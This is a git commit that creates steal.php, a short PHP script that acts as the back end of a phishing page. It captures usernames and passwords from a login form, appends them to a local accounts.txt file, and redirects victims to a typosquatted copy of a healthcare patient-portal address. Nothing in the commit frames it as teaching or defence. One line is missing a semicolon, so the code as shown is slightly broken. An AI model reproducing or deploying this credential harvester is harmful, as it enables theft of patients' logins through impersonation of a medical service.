e413e1daee92d61e00c61507df1cbe9a9c031c09
Jay Mirecki <43052836+jaymirecki@users.noreply.github.com>
2018-12-12 16:56:16 -0500

    Create steal.php

---
+++ steal.php
@@ -0,0 +1,9 @@
+<?php
+  $username = $_POST["username"];
+  $password = $_POST["password"];
+  $output = fopen("accounts.txt", "a");
+  $output_string = $username . " " . $password . "\n"
+  fwrite($output, $output_string);
+  fclose($output);
+  header("Location: https://jaymirecki.github.com/patientgatevvay.partners.org");
+  ?>
